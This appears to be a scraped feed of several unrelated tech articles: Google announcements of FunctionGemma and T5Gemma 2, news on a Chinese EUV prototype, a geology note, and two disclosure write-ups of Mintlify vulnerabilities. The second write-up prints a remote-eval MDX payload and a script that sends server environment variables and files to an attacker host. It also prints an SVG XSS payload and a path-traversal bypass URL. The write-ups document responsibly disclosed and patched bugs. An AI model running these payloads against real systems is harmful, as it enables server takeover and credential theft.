    &lt;p&gt;It has been a transformative year for the Gemma family of models. In 2025, we have grown from 100 million to over 300 million downloads while demonstrating the transformative potential of open models, from defining state-of-the-art single-accelerator performance with Gemma 3 to advancing cancer research through the C2S Scale initiative.&lt;/p&gt;
    &lt;p&gt;Since launching the Gemma 3 270M model, the number one request we’ve received from developers is for native function calling capabilities. We listened, recognizing that as the industry shifts from purely conversational interfaces to active agents, models need to do more than just talk — they need to act. This is particularly compelling on-device, where agents can automate complex, multi-step workflows, from setting reminders to toggling system settings. To enable this at the edge, models must be lightweight enough to run locally and specialized enough to be reliable.&lt;/p&gt;
    &lt;p&gt;Today, we are releasing FunctionGemma, a specialized version of our Gemma 3 270M model tuned for function calling. It is designed as a strong base for further training into custom, fast, private, local agents that translate natural language into executable API actions.&lt;/p&gt;
    &lt;p&gt;FunctionGemma acts as a fully independent agent for private, offline tasks, or as an intelligent traffic controller for larger connected systems. In this role, it can handle common commands instantly at the edge, while routing more complex tasks to models like Gemma 3 27B.&lt;/p&gt;
    &lt;head rend="h3"&gt;What makes FunctionGemma unique&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Unified action and chat: FunctionGemma knows how to talk to both computers and humans. It can generate structured function calls to execute tools, then switch context to summarize the results in natural language for the user.&lt;/item&gt;
      &lt;item&gt;Built for customization: FunctionGemma is designed to be molded, not just prompted. In our "Mobile Actions" evaluation, fine-tuning transformed the model’s reliability, boosting accuracy from a 58% baseline to 85%. This confirms that for edge agents, a dedicated, trained specialist is an efficient path to production-grade performance.&lt;/item&gt;
      &lt;item&gt;Engineered for the edge: Small enough to run on edge devices like the NVIDIA Jetson Nano and mobile phones, the model uses Gemma’s 256k vocabulary to efficiently tokenize JSON and multilingual inputs. This makes it a strong base for fine-tuning in specific domains, reducing sequence length to ensure minimum latency and total user privacy.&lt;/item&gt;
      &lt;item&gt;Broad ecosystem support: The model is supported by popular tools across the entire workflow: fine-tune with Hugging Face Transformers, Unsloth, Keras or NVIDIA NeMo and deploy using LiteRT-LM, vLLM, MLX, Llama.cpp, Ollama, Vertex AI or LM Studio.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;FunctionGemma accuracy on Mobile Actions dataset before and after fine-tuning on a held out eval set.&lt;/p&gt;
    &lt;head rend="h2"&gt;When to choose FunctionGemma&lt;/head&gt;
    &lt;p&gt;FunctionGemma is the bridge between natural language and software execution. It is the right tool if:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;You have a defined API surface: Your application has a defined set of actions (e.g., smart home, media, navigation).&lt;/item&gt;
      &lt;item&gt;You are ready to fine-tune: You need the consistent, deterministic behavior that comes from fine-tuning on specific data, rather than the variability of zero-shot prompting.&lt;/item&gt;
      &lt;item&gt;You prioritize local-first deployment: Your application requires near-instant latency and total data privacy, running efficiently within the compute and battery limits of edge devices.&lt;/item&gt;
      &lt;item&gt;You are building compound systems: You need a lightweight edge model to handle local actions, allowing your system to process common commands on-device and only query larger models (like Gemma 3 27B) for more complex tasks.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;How to see it in action&lt;/head&gt;
    &lt;p&gt;Let's look at how these models transform actual user experiences. You can explore these capabilities in the Google AI Edge Gallery app through two distinct experiences: an interactive game and a developer challenge.&lt;/p&gt;
    &lt;head rend="h3"&gt;Mobile Actions fine tuning&lt;/head&gt;
    &lt;p&gt;This demo reimagines assistant interaction as a fully offline capability. Whether it’s "Create a calendar event for lunch tomorrow," "Add John to my contacts" or "Turn on the flashlight," the model parses the natural language and identifies the correct OS tool to execute the command. To unlock this agent, developers are invited to use our fine-tuning cookbook to build the model and load it onto their mobile device.&lt;/p&gt;
    &lt;head rend="h3"&gt;TinyGarden game demo&lt;/head&gt;
    &lt;p&gt;In this interactive mini-game, players use voice commands to manage a virtual plot of land. You might say, "Plant sunflowers in the top row and water them," and the model decomposes this into specific app functions like plantCrop or waterCrop targeting specific grid coordinates. This proves that a 270M model can handle multi-turn logic to drive custom game mechanics, on a mobile phone, without ever pinging a server.&lt;/p&gt;
    &lt;head rend="h3"&gt;FunctionGemma Physics Playground&lt;/head&gt;
    &lt;p&gt;Use natural language to solve fun physics simulation puzzles in a game that runs 100% locally in your browser, powered by FunctionGemma and Transformers.js!&lt;/p&gt;
    &lt;p&gt;Credit: @xenovacom on X&lt;/p&gt;
    &lt;head rend="h2"&gt;How to try FunctionGemma today&lt;/head&gt;
    &lt;p&gt;We are moving from an era of chatbots to an era of action. With FunctionGemma, that power now fits in your pocket.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Download: Get the model on Hugging Face or Kaggle.&lt;/item&gt;
      &lt;item&gt;Learn: Check out the guides on function calling templates, how to sequence the model with function responses and fine-tuning.&lt;/item&gt;
      &lt;item&gt;Explore: Download the updated Google AI Edge Gallery to try the demos.&lt;/item&gt;
      &lt;item&gt;Build: Access the Mobile Actions guide with a Colab notebook and dataset to train your own specialized agent.&lt;/item&gt;
      &lt;item&gt;Deploy: Easily publish your own models onto mobile devices using LiteRT-LM or use alongside larger models on Vertex AI or NVIDIA devices like RTX PRO and DGX Spark.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We can’t wait to see the unique, private, and ultra-fast experiences you unlock on-device.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://blog.google/technology/developers/functiongemma/"/><published>2025-12-18T18:26:52+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46316907</id><title>How China built its ‘Manhattan Project’ to rival the West in AI chips</title><updated>2025-12-18T20:39:02.312375+00:00</updated><content>&lt;doc fingerprint="ffc334920e9cd3af"&gt;
  &lt;main&gt;
    &lt;p&gt;In a high-security Shenzhen laboratory, Chinese scientists have built what Washington has spent years trying to prevent: a prototype of a machine capable of producing the cutting-edge semiconductor chips that power artificial intelligence, smartphones and weapons central to Western military dominance.&lt;/p&gt;
    &lt;p&gt;Completed in early 2025 and now undergoing testing, the prototype fills nearly an entire factory floor. It was built by a team of former engineers from Dutch semiconductor giant ASML who reverse-engineered the company’s extreme ultraviolet lithography machines (EUVs), according to two people with knowledge of the project.&lt;/p&gt;
    &lt;p&gt;EUV machines sit at the heart of a technological Cold War. They use beams of extreme ultraviolet light to etch circuits thousands of times thinner than a human hair onto silicon wafers, currently a capability monopolized by the West. The smaller the circuits, the more powerful the chips.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.japantimes.co.jp/business/2025/12/18/tech/china-west-ai-chips/"/><published>2025-12-18T18:55:34+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46317098</id><title>We pwned X, Vercel, Cursor, and Discord through a supply-chain attack</title><updated>2025-12-18T20:39:01.963449+00:00</updated><content>&lt;doc fingerprint="b4b0b02b285796c6"&gt;
  &lt;main&gt;
    &lt;p&gt;hi, i'm daniel. i'm a 16-year-old high school senior. in my free time, i hack billion dollar companies and build cool stuff.&lt;/p&gt;
    &lt;p&gt;about a month ago, a couple of friends and I found serious critical vulnerabilities on Mintlify, an AI documentation platform used by some of the top companies in the world.&lt;/p&gt;
    &lt;p&gt;i found a critical cross-site scripting vulnerability that, if abused, would let an attacker to inject malicious scripts into the documentation of numerous companies and steal credentials from users with a single link open.&lt;/p&gt;
    &lt;p&gt;(go read my friends' writeups (after this one)) &lt;lb/&gt; how to hack discord, vercel, and more with one easy trick (eva) &lt;lb/&gt; Redacted by Counsel: A supply chain postmortem (MDL)&lt;/p&gt;
    &lt;p&gt;here's my story...&lt;/p&gt;
    &lt;p&gt;My story begins on Friday, November 7, 2025, when Discord announced a brand new update to their developer documentation platform. They were previously using a custom built documentation platform, but were switching to an AI-powered documentation platform.&lt;/p&gt;
    &lt;p&gt;Discord is one of my favorite places to hunt for vulnerabilities since I'm very familiar with their API and platform. I'm at the top of their bug bounty leaderboard having reported nearly 100 vulnerabilities over the last few years. After you've gone through every feature at least 10 times, it gets boring.&lt;/p&gt;
    &lt;p&gt;I found this new update exciting, and as soon as I saw the announcement, I started looking through how they implemented this new documentation platform.&lt;/p&gt;
    &lt;p&gt;Mintlify is an AI-powered documentation platform. You write your documentation as markdown and Mintlify turns it into a beautiful documentation platform with all the modern features a documentation platform needs. (Despite the vulnerabilities we found, I would highly recommend them. They make it really easy to create beautiful docs that work.)&lt;/p&gt;
    &lt;p&gt;Mintlify-hosted documentation sites are on the *.mintlify.app domains, with support for custom domains. In Discord's case, they were just proxying certain routes to their Mintlify documentation at &lt;code&gt;discord.mintlify.app&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Every Mintlify subdomain has a &lt;code&gt;/_mintlify/*&lt;/code&gt; path that is used internally on the platform to power certain features. Regardless of whether it's hosted through the &lt;code&gt;mintlify.app&lt;/code&gt; domain or a custom domain, the &lt;code&gt;/_mintlify&lt;/code&gt; path must be accessible to power the documentation.
&lt;/p&gt;
    &lt;p&gt;(For example, the &lt;code&gt;/api/user&lt;/code&gt; path for authentication: https://docs.x.com/_mintlify/api/user, https://discord.com/_mintlify/api/user, etc)&lt;/p&gt;
    &lt;p&gt;After Discord switched to Mintlify and when I started looking for bugs on the platform, from the get-go, my plan was to find a way to render another Mintlify documentation through Discord's domain.&lt;/p&gt;
    &lt;p&gt;At first, I tried path traversal attacks, but they didn't work. Then, I started looking through the &lt;code&gt;/_mintlify&lt;/code&gt; API endpoints.&lt;/p&gt;
    &lt;p&gt;Using Chrome DevTools to search the assets, I found the endpoint &lt;code&gt;/_mintlify/_markdown/_sites/[subdomain]/[...route]&lt;/code&gt;. It accepted any Mintlify documentation (&lt;code&gt;[subdomain]&lt;/code&gt;) and it returned a file from that specific documentation (&lt;code&gt;[...route]&lt;/code&gt;). The endpoint didn't check to make sure the &lt;code&gt;[subdomain]&lt;/code&gt; matched with the current host, which means you could fetch files from any Mintlify documentation on an host with the &lt;code&gt;/_mintlify/&lt;/code&gt; route.&lt;/p&gt;
    &lt;p&gt;Unfortunately, this endpoint only returned raw markdown text. The markdown wasn't rendered as HTML, meaning it was impossible to run code. I spent the rest of the time trying different ways to bypass this, but nothing worked.&lt;/p&gt;
    &lt;p&gt;Fast forward 2 days to Sunday, November 9, 2025, I went back to hunting.&lt;/p&gt;
    &lt;p&gt;I was confident there was another endpoint, like the markdown one, which could fetch and return cross-site data, but I couldn't find one. I tried searching web assets and some other techniques, but I couldn't find the endpoint I was looking for.&lt;/p&gt;
    &lt;p&gt;Finally, I decided to look through the Mintlify CLI. Mintlify lets you run your documentation site locally via their npm package (@mintlify/cli). I realized that this probably meant the code powering the documentation platform was somewhat public.&lt;/p&gt;
    &lt;p&gt;After digging through the package and downloading tarballs linked in the code, I found myself at exactly what I was looking for.&lt;/p&gt;
    &lt;p&gt;Jackpot!&lt;/p&gt;
    &lt;p&gt;This was a list of application endpoints (compiled by Nextjs), and in the middle, there's the endpoint &lt;code&gt;/_mintlify/static/[subdomain]/[...route]&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Like the markdown endpoint, this endpoint accepted any Mintlify documentation (&lt;code&gt;[subdomain]&lt;/code&gt;). The only difference was this endpoint returned static files from the documentation repo.&lt;/p&gt;
    &lt;p&gt;First, I tried accessing HTML and JavaScript files but it didn't work; I realized there was some sort of whitelist of file extensions. Then, I tried an SVG file, and it worked.&lt;/p&gt;
    &lt;p&gt;If you didn't know, you can embed JavaScript into an SVG file. The script doesn't run unless the file is directly opened (you can't run scripts from (&lt;code&gt;&amp;lt;img src="/image.svg"&amp;gt;&lt;/code&gt;). This is very common knowledge for security researchers.&lt;/p&gt;
    &lt;p&gt;I created an SVG file with an embedded script, uploaded it to my Mintlify documentation, and opened the endpoint through Discord (https://discord.com/_mintlify/_static/hackerone-a00f3c6c/lmao.svg). It worked!&lt;/p&gt;
    &lt;p&gt;XSS attacks are incredibly rare on Discord, so I shared it with a couple friends.&lt;/p&gt;
    &lt;p&gt;I sent a screenshot to xyzeva, only to find out she had also been looking into Mintlify after the Discord switch. She had previously discovered other vulnerabilities on the Mintlify platform, and had found more that she was preparing to disclose (go read her writeup!). I find it funny we had both separately been looking into Mintlify and found very different, but very critical bugs.&lt;/p&gt;
    &lt;p&gt;Another friend joined, and we created a group chat.&lt;/p&gt;
    &lt;p&gt;We reported the vulnerability to Discord and attempted to contact Mintlify through an employee.&lt;/p&gt;
    &lt;p&gt;Discord took this very seriously, and closed off its entire developer documentation for 2 hours while investigating the impact of this vulnerability. Then, they reverted to their old documentation platform and removed all the Mintlify routes. https://discordstatus.com/incidents/by04x5gnnng3&lt;/p&gt;
    &lt;p&gt;&lt;lb/&gt; Mintlify contacted us directly very shortly after hearing about the vulnerability through Discord. We set up a Slack channel with Mintlify's engineering team and got to work. Personally, this cross-site scripting attack was the only thing I had the time to find; eva and MDL worked with Mintlify's engineering team to quickly remediate this and other vulnerabilities they found on the platform.&lt;/p&gt;
    &lt;p&gt;In total, the cross-site scripting attack affected almost every Mintlify customer. To name a few: X (Twitter), Vercel, Cursor, Discord, and more.&lt;/p&gt;
    &lt;p&gt;These customers host their documentation on their primary domains and were vulnerable to account takeovers with a single malicious link.&lt;/p&gt;
    &lt;p&gt;Fortunately, we responsibly found and disclosed this vulnerability but this is an example of how compromising a single supply chain can lead to a multitude of problems.&lt;/p&gt;
    &lt;p&gt;In total, we collectively recieved ~$11,000 in bounties. Discord paid $4,000 and Mintlify individually gave us bounties for the impact of the bugs we individually found.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://gist.github.com/hackermondev/5e2cdc32849405fff6b46957747a2d28"/><published>2025-12-18T19:08:48+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46317174</id><title>The Scottish Highlands, the Appalachians, Atlas are the same mountain range</title><updated>2025-12-18T20:39:01.401695+00:00</updated><content>&lt;doc fingerprint="edddc0dbd95864a5"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;The Scottish Highlands, the Appalachians, and the Atlas are the same mountain range, once connected as the Central Pangean Mountains&lt;/head&gt;
    &lt;p&gt;The Central Pangean Mountains were a great mountain chain in the middle part of the supercontinent Pangaea that stretches across the continent from northeast to southwest during the Carboniferous, Permian Triassic periods. The ridge was formed as a consequence of a collision between the supercontinents Laurussia and Gondwana during the formation of Pangaea. It was similar to the present Himalayas at its highest elevation during the beginning of the Permian period.&lt;/p&gt;
    &lt;p&gt;It’s hard to imagine now that once upon a time that the Scottish Highlands, the Appalachians, the Ouachita Mountains, and the Little Atlas of Morocco are the same mountain range, once connected as the Central Pangean Mountains.&lt;/p&gt;
    &lt;p&gt;During the Permian period, the Central Pangean were subjected to significant physical weathering, decreasing the peaks and forming many deep intermontane plains. By the Middle Triassic, the mountain sierras had been considerably reduced in size. By the beginning of the Jurassic period (200 mln years ago), the Pangean chain in Western Europe disappeared to some highland regions separated by deep marine basins.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://vividmaps.com/central-pangean-mountains/"/><published>2025-12-18T19:15:17+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46317546</id><title>How to hack Discord, Vercel and more with one easy trick</title><updated>2025-12-18T20:39:01.069438+00:00</updated><content>&lt;doc fingerprint="b461b8d9682777c9"&gt;
  &lt;main&gt;
    &lt;p&gt;this blogpost was a collaboration with two people, their articles are here: hackermon and mdl&lt;/p&gt;
    &lt;p&gt;this started when i was notified that discord switched documentation platforms to mintlify, a company i briefly looked into before, and i thought it would be a good idea to take another look now that theyre bigger.&lt;/p&gt;
    &lt;head rend="h2"&gt;introduction&lt;/head&gt;
    &lt;p&gt;mintlify is a b2b saas documentation platform that allows companies to make documentation via MDX files and they host it for them, and add styling, etc.&lt;/p&gt;
    &lt;p&gt;some of their customers would include:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;discord&lt;/item&gt;
      &lt;item&gt;vercel&lt;/item&gt;
      &lt;item&gt;cursor&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;...and more, you can view a full list here&lt;/p&gt;
    &lt;p&gt;theres also a bunch of ai features and stuff, but thats beyond the point&lt;/p&gt;
    &lt;p&gt;so, i signed up and got to digging.&lt;/p&gt;
    &lt;head rend="h2"&gt;the rce (CVE-2025-67843)&lt;/head&gt;
    &lt;p&gt;mintlify uses MDX to render docs their customers provide, and i was wondering how they render it on the server-side for static page generation (because a docs site needs that for search engines/bots).&lt;/p&gt;
    &lt;p&gt;this is because mdx is basically jsx (think react) combined with markdown, meaning you can add js expressions to your markdown. so whats preventing us from making a jsx expression that evaluates code on the server?&lt;/p&gt;
    &lt;p&gt;well, i tried it with a simple payload to just eval things from a webserver&lt;/p&gt;
    &lt;code&gt;{!!fetch("https://attacker.kibty.town").then((r) =&amp;gt; r.text()).then((c) =&amp;gt; eval(c))}
&lt;/code&gt;
    &lt;p&gt;i deployed it to mintlify and went to the page it was on, and i got a request from a vercel/amazon ip! are they really doing this on their nextjs app?&lt;/p&gt;
    &lt;p&gt;i wrote a simple script to exfilitrate some data such as the process.env (and app files) to find out:&lt;/p&gt;
    &lt;code&gt;const exfil = (data) =&amp;gt;
  fetch("https://attacker.kibty.town", {
    method: "POST",
    body: JSON.stringify(data),
  });
exfil({ files: [{ name: ".env.json", content: JSON.stringify(process.env) }] });
try {
  import("fs").then(async (a) =&amp;gt; {
    const arr = [];
    for (const filename of a.readdirSync(".", { recursive: true })) {
      if (a.lstatSync(filename).isDirectory()) continue;
      const content = a.readFileSync(filename, "utf-8");
      arr.push({ name: filename, content });
    }
    console.log(arr.length);
    await exfil({ files: arr });
    console.log("done exfiling");
  });
} catch (error) {
  exfil(error);
}
&lt;/code&gt;
    &lt;p&gt;and, after running it, this is what i got:&lt;/p&gt;
    &lt;p&gt;shit. this is bad, we have full access.&lt;/p&gt;
    &lt;head rend="h3"&gt;impact&lt;/head&gt;
    &lt;p&gt;i quickly realised that this was the server-side serverless (lol) environment of their main documentation app, while this calls to a external api to do everything, we have the token it calls it with in the env.&lt;/p&gt;
    &lt;p&gt;alongside, we can poison the nextjs cache for everyone for any site, allowing mass xss, defacing, etc on any docs site.&lt;/p&gt;
    &lt;p&gt;we can also pretend nonexistent pages exist in the cache, allowing targeted xss too&lt;/p&gt;
    &lt;p&gt;with the other keys we could also:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;poisoned mintlifys analytics&lt;/item&gt;
      &lt;item&gt;ruined mintlifys feature flagging&lt;/item&gt;
      &lt;item&gt;dos'ed customer sites via path validations&lt;/item&gt;
      &lt;item&gt;trigger a bunch of pdf exports which would jack up mintlifys cloudconvert bill&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;so:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;mass xss (on customer domains)&lt;/item&gt;
      &lt;item&gt;targeted xss (on custom domains)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;very bad.&lt;/p&gt;
    &lt;head rend="h2"&gt;targeted xss (CVE-2025-67842)&lt;/head&gt;
    &lt;p&gt;after getting all of the server routes, i noticed a interesting one: &lt;code&gt;/_mintlify/static/[subdomain]/{...path}&lt;/code&gt;. this route seemed to allow you to get static images from your repository, such as svgs, pngs, etc.&lt;/p&gt;
    &lt;p&gt;what if i could access my organizations asset from another domain?&lt;/p&gt;
    &lt;p&gt;well i tried, i crafted a url that looked like&lt;/p&gt;
    &lt;code&gt;https://discord.com/_mintlify/static/evascoolcompany/xss.svg
&lt;/code&gt;
    &lt;p&gt;which, the svg on my repository having this content:&lt;/p&gt;
    &lt;code&gt;&amp;lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(window.origin);"/&amp;gt;
&lt;/code&gt;
    &lt;p&gt;and when i went to the url, i got this:&lt;/p&gt;
    &lt;p&gt;well, fuck.&lt;/p&gt;
    &lt;head rend="h3"&gt;impact&lt;/head&gt;
    &lt;p&gt;this allows complete 1 click xss on users who click a link. definitely not great, but it makes the fact worse that most companies dont properly scope cookies, or have their documentation on a subpath (such as &lt;code&gt;/path&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;the latter was true in discords case, their documentation was on &lt;code&gt;/developers/docs&lt;/code&gt;, and i can just get the &lt;code&gt;token&lt;/code&gt; value from localstorage directly, and exfiltrate it using whatever i want&lt;/p&gt;
    &lt;p&gt;some other companies that i could do full exploitation on are twitter, vercel and cursor. though we did not check many companies and there is definitely more&lt;/p&gt;
    &lt;head rend="h2"&gt;an unexpected message&lt;/head&gt;
    &lt;p&gt;a few hours after i started looking into this, i got an unexpected, sort of out of nowhere message from a friend, hackermon, who had found the targeted xss independently aswell&lt;/p&gt;
    &lt;p&gt;we started looking into this together, alongside mdl, who was also looking into it with hackermon&lt;/p&gt;
    &lt;p&gt;also checkout their blogposts here and here! (respectively)&lt;/p&gt;
    &lt;p&gt;we also got in contact with mintlify, and started disclosing everything we already had and future things directly to them&lt;/p&gt;
    &lt;head rend="h2"&gt;here comes the patch bypass (CVE-2025-67845)&lt;/head&gt;
    &lt;p&gt;after mintlify patched the targeted xss via static, i was looking at the code for the route and had an idea&lt;/p&gt;
    &lt;p&gt;the code for the endpoint looked like this (not exact, recreation):&lt;/p&gt;
    &lt;code&gt;export async function GET(_, { params }) {
  const { subdomain, path: pathParts } = await params;
  const path = "/" + pathParts.join("/");

  const url = `${CDN_BASE_URL}/${subdomain}${path}`;
  const res = await fetch(url);

  if (!res.ok)
    return new NextResponse("Asset not found", {
      status: 404,
    });

  return res; // inaccurate, does more operations but we simply dont care about them here
}
&lt;/code&gt;
    &lt;p&gt;and i realised, nothing prevents us from adding url encoded path traversal in a part of a path, to climb up the cdn path&lt;/p&gt;
    &lt;p&gt;so i crafted a url and tested, it looked like&lt;/p&gt;
    &lt;code&gt;https://discord.com/_mintlify/static/discord/images/create-team-owned-app.png%2F..%2F..%2F..%2Fevascoolcompany%2Fxss.svg
&lt;/code&gt;
    &lt;p&gt;and i was met with the beautiful alert page again&lt;/p&gt;
    &lt;p&gt;always remember to encode your paths properly!&lt;/p&gt;
    &lt;head rend="h2"&gt;non-critical vulnerabilities&lt;/head&gt;
    &lt;p&gt;alongside this, i found a few non-critical vulnerabilties which don't deserve an entire section, so here they are:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;github idor (CVE-2025-67844): mintlify doesn't validate the github repository owner/name fields on their api while your setting it, allowing you to set it to any authorized repository. allowing you to view commit details (message, hash, filename, files changed, etc) for new commits&lt;/item&gt;
      &lt;item&gt;downgrade attack (CVE-2025-67846): mintlify uses vercel to facilitate deployments of both their client and the dashboard. a common pitfall when using vercel is that you fail to remove a previous deployment with a vulnerability in it, so you can target a specific previous vulnerable deployment id / git branch / git ref, and use that to facilitate the patched exploit.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;add it to your repository, wait for the deployment to build and access it on any mintlify-provided documentation/custom domain with the path &lt;code&gt;/_mintlify/static/evascoolcompany/xss.svg&lt;/code&gt; or similar with prefixes&lt;/p&gt;
    &lt;head rend="h2"&gt;lets talk impact (again)&lt;/head&gt;
    &lt;p&gt;all together, i think this series of vulnerabilities had very big impact. considering we could supply chain attack various big fortune 500 companies, including but not limited to:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;discord&lt;/item&gt;
      &lt;item&gt;vercel&lt;/item&gt;
      &lt;item&gt;cursor&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;...and more, you can view a full list here&lt;/p&gt;
    &lt;p&gt;we could on targeted companies:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;override pages on docs to deface, or xss&lt;/item&gt;
      &lt;item&gt;get 1 click xss&lt;/item&gt;
      &lt;item&gt;view commits or push to repositories&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;the patch&lt;/head&gt;
    &lt;p&gt;after we got in contact with mintlify, everything was patched very swiftly. and i was awarded 5,000 USD for my efforts and findings.&lt;/p&gt;
    &lt;p&gt;the patches for the vulnerabilties were:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;the rce (CVE-2025-67843): not parsing non-simple mdx expressions on ssr, but still parsing on client&lt;/item&gt;
      &lt;item&gt;targeted xss (CVE-2025-67842): you are now not able to reach any mintlify assets that are not on the same organization&lt;/item&gt;
      &lt;item&gt;targeted xss patch bypass (CVE-2025-67845): theres now checks to make sure you aren't path traversing the cdn path&lt;/item&gt;
      &lt;item&gt;github idor (CVE-2025-67844): its now checked on setting github repository that the github app installation registered to your mintlify account has access to the specified repository&lt;/item&gt;
      &lt;item&gt;downgrade attack (CVE-2025-67846): theres now a visitor password on preview deployments on vercel and purging old deployments that were vulnerable, you can read the vercel documentation on this here&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;make sure to check out hackermon and mdl's reports for more details on other vulnerabilties, and the possible exploitation that couldve happened.&lt;/p&gt;
    &lt;p&gt;card by marshift&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://kibty.town/blog/mintlify/"/><published>2025-12-18T19:41:24+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46317657</id><title>T5Gemma 2: The next generation of encoder-decoder models</title><updated>2025-12-18T20:39:00.875026+00:00</updated><content>&lt;doc fingerprint="3fd98798b4f2055e"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;T5Gemma 2: The next generation of encoder-decoder models&lt;/head&gt;
    &lt;p&gt;T5Gemma 2 is the next evolution of our encoder-decoder family based on Gemma 3, featuring the first multi-modal and long-context encoder-decoder models.&lt;/p&gt;
    &lt;p&gt;Unlike T5Gemma, T5Gemma 2 adopts tied word embeddings (over encoder and decoder) and merged decoder self- and cross-attention to save model parameters. It offers compact pre-trained models at sizes of 270M-270M (~370M total, excluding vision encoder), 1B-1B (~1.7B) and 4B-4B (~7B) parameters, making them ideal for rapid experimentation and deployment in on-device applications.&lt;/p&gt;
    &lt;head rend="h2"&gt;Background&lt;/head&gt;
    &lt;p&gt;With the original T5Gemma, we demonstrated that we could successfully adapt modern, pre-trained decoder-only models into an encoder-decoder architecture, unlocking new versatility. By initializing with weights from a powerful decoder-only model and then applying continued pre-training, we created high-quality, inference-efficient models while bypassing the computational cost of training from scratch.&lt;/p&gt;
    &lt;p&gt;T5Gemma 2 extends this into the realm of vision-language models by incorporating key innovations from Gemma 3.&lt;/p&gt;
    &lt;head rend="h2"&gt;What’s new&lt;/head&gt;
    &lt;p&gt;T5Gemma 2 is more than a re-training. It incorporates significant architectural changes while inheriting many of the powerful, next-generation features of the Gemma 3 family.&lt;/p&gt;
    &lt;head rend="h3"&gt;Architectural innovations for efficiency&lt;/head&gt;
    &lt;p&gt;To maximize efficiency at smaller scales, we have introduced key structural refinements:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Tied embeddings: We now tie the embeddings between the encoder and decoder. This significantly reduces the overall parameter count, allowing us to pack more active capabilities into the same memory footprint — crucial for our new compact 270M-270M model.&lt;/item&gt;
      &lt;item&gt;Merged attention: In the decoder, we adopt a merged attention mechanism, combining self- and cross-attention into a single, unified attention layer. This reduces model parameters and architectural complexity, improving model parallelization and benefiting inference.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Next-generation capabilities&lt;/head&gt;
    &lt;p&gt;Drawing from Gemma 3, T5Gemma 2 also represents a significant upgrade in model capabilities:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Multimodality: T5Gemma 2 models can understand and process images alongside text. By utilizing a highly efficient vision encoder, the models can seamlessly perform visual question answering and multimodal reasoning tasks.&lt;/item&gt;
      &lt;item&gt;Extended long context: We've dramatically expanded the context window. Leveraging Gemma 3's alternating local and global attention mechanism, T5Gemma 2 can handle context windows of up to 128K tokens.&lt;/item&gt;
      &lt;item&gt;Massively multilingual: Trained on a larger, more diverse dataset, these models now support over 140 languages out of the box.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Performance&lt;/head&gt;
    &lt;p&gt;T5Gemma 2 sets a new standard for what compact encoder-decoder models can achieve. Our new models demonstrate strong performance across key capability areas, inheriting the powerful multimodal and long-context features from the Gemma 3 architecture.&lt;/p&gt;
    &lt;p&gt;Pre-training performance of Gemma 3, T5Gemma and T5Gemma 2 across five unique capabilities.&lt;/p&gt;
    &lt;p&gt;As shown in the charts above, T5Gemma 2 delivers:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Strong multimodal performance, outperforming Gemma 3 on several benchmarks. We adapt text-only Gemma 3 base models (270M and 1B) into effective multimodal encoder-decoder models.&lt;/item&gt;
      &lt;item&gt;Superior long-context capability, with substantial quality gains over Gemma 3 and T5Gemma. Using a separate encoder makes T5Gemma 2 better at handling long-context problems.&lt;/item&gt;
      &lt;item&gt;Improved general capabilities. Across coding, reasoning and multilingual tasks, T5Gemma 2 generally surpasses its corresponding Gemma 3 counterpart.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Post-training performance. Note: we are not releasing any post-trained / IT checkpoints. These results here are only for illustration, where we performed a minimal SFT without RL for T5Gemma 2. Also note pre-training and post-training benchmarks are different, so scores are not comparable across plots.&lt;/p&gt;
    &lt;p&gt;Similar to the original T5Gemma, we find that the post-training performance of T5Gemma 2 generally yields better results than its decoder-only counterparts. This makes T5Gemma 2 suitable for both large language model research as well as downstream applications.&lt;/p&gt;
    &lt;head rend="h2"&gt;Getting started&lt;/head&gt;
    &lt;p&gt;We’re looking forward to seeing what the community builds with T5Gemma 2. This release includes pre-trained checkpoints, designed to be post-trained by developers for specific tasks before deployment.&lt;/p&gt;
